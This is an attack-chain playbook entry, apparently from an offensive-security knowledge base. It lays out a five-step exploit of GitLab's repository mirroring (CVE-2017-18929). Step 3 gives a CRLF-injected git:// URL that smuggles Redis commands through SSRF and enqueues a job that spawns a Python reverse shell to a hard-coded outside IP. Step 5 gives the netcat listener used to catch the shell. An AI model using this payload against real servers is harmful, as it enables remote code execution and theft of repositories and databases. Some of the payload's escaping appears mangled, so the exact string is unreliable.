---
id: ac-gitlab-crlf-ssrf-rce
tags:
  - ssrf
  - crlf-injection
  - rce
  - gitlab
  - redis
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Fiddler]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Configure-GitLab-Redis-Instance]]'
  - '[[procedures/Create-GitLab-Project-and-Access-Mirroring]]'
  - '[[procedures/Inject-CRLF-Payload-in-Mirror-URL]]'
  - '[[procedures/Trigger-Mirror-Update-for-Payload-Execution]]'
  - '[[procedures/Establish-Reverse-Shell-Connection]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
updated_at: '2025-12-14T04:09:00.718Z'
description: >-
  A multi-stage attack exploiting CRLF injection and SSRF in GitLab's repository
  mirroring feature to manipulate Redis queues and achieve remote code execution
  via a reverse shell.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
---
---

# GitLab CRLF Injection and SSRF via git:// Protocol Leading to Arbitrary Code Execution

Multi-stage attack chain demonstrating a complete attack workflow exploiting vulnerabilities in GitLab's repository mirroring to achieve arbitrary code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Redis] --> B[Project Creation]
    B --> C[Payload Injection]
    C --> D[Trigger Mirroring]
    D --> E[Reverse Shell]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#f39c12
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]
- [[tools/Fiddler]]
- Netcat or similar for listening on attacker port

### Target Environment

- GitLab instance (version vulnerable to CVE-2017-18929 or similar) with Redis configured on TCP socket at localhost:6379
- Linux-based server hosting GitLab and Redis
- Web access to GitLab UI

### Initial Access Requirements

- Valid authenticated user account in GitLab with permissions to create projects and configure repository mirroring
- Attacker machine with network access to GitLab and ability to receive connections on a public IP:port (e.g., 118.89.198.146:8000)
- No prior root access needed, but authenticated session required

## Detailed Attack Procedures

### Step 1: Configure Redis Instance
procedure: [[procedures/Configure-GitLab-Redis-Instance]]

**Objective**: Ensure Redis is set up on the target GitLab instance to allow payload injection via SSRF.

**Instructions**: Follow GitLab documentation to configure Redis listening on 127.0.0.1:6379 using TCP socket. Verify the service is running and accessible internally.

**Expected Output**: Redis server responsive on localhost:6379.

**Success Indicators**:
- Redis process active: `ps aux | grep redis`
- Port listening: `netstat -tuln | grep 6379`

### Step 2: Create Project and Access Mirroring Settings
procedure: [[procedures/Create-GitLab-Project-and-Access-Mirroring]]

**Objective**: Gain access to the repository mirroring configuration in a new GitLab project.

**Instructions**: Sign in to GitLab, create a new project, and navigate to Settings > Repository > Mirroring repositories section.

**Expected Output**: Mirroring configuration form visible.

**Success Indicators**:
- Project created successfully
- Mirroring tab accessible without errors

### Step 3: Inject Malicious Payload in Mirror URL
procedure: [[procedures/Inject-CRLF-Payload-in-Mirror-URL]]

**Objective**: Use CRLF injection in the git:// URL to send Redis commands via SSRF, enqueuing a malicious job for RCE.

**Instructions**: Intercept the POST request for adding a mirror using [[tools/Burp-Suite]] or [[tools/Fiddler]]. Modify the `project[remote_mirrors_attributes][0][url]` parameter to include the crafted payload: `git://127.0.0.1:6379/\nmulti\nsadd resque:gitlab:queues system_hook_push\nlpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3 -c \\\\import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(\\"118.89.198.146\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\",\\\"-i\\\"]);\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"\nexec\n/bbbbb/ccccc'`. Forward the modified request.

**Expected Output**: Mirror added successfully, payload injected into Redis.

**Success Indicators**:
- HTTP 200 response on POST
- No validation errors in GitLab UI

### Step 4: Trigger Mirror Update for Payload Execution
procedure: [[procedures/Trigger-Mirror-Update-for-Payload-Execution]]

**Objective**: Initiate the mirroring process to process the injected Redis queue and execute the RCE payload.

**Instructions**: Send a POST request to `/{username}/{project}/mirror/update_now?sync_remote=true` to start mirroring.

**Expected Output**: Mirroring job queued and executed, triggering GitlabShellWorker.

**Success Indicators**:
- 200 OK response from update endpoint
- No errors in GitLab logs related to mirroring

### Step 5: Establish Reverse Shell Connection
procedure: [[procedures/Establish-Reverse-Shell-Connection]]

**Objective**: Receive and interact with the reverse shell spawned by the Python payload.

**Instructions**: On the attacker machine, listen on the specified port (e.g., 8000) using netcat: `nc -lvnp 8000`. The payload connects back, providing a shell.

**Expected Output**: Interactive shell session with access to GitLab host.

**Success Indicators**:
- Incoming connection from target IP
- Shell prompt allowing commands like `whoami` or `ls /var/www/gitlab`

## Attack Chain Summary

### Key Achievements

1. Bypassed URL restrictions using git:// protocol for SSRF to internal Redis.
2. Injected CRLF to execute Redis commands, manipulating GitLab queues.
3. Achieved RCE via GitlabShellWorker class_eval with Python reverse shell.
4. Gained shell access to sensitive data like git repositories and databases.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Python]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
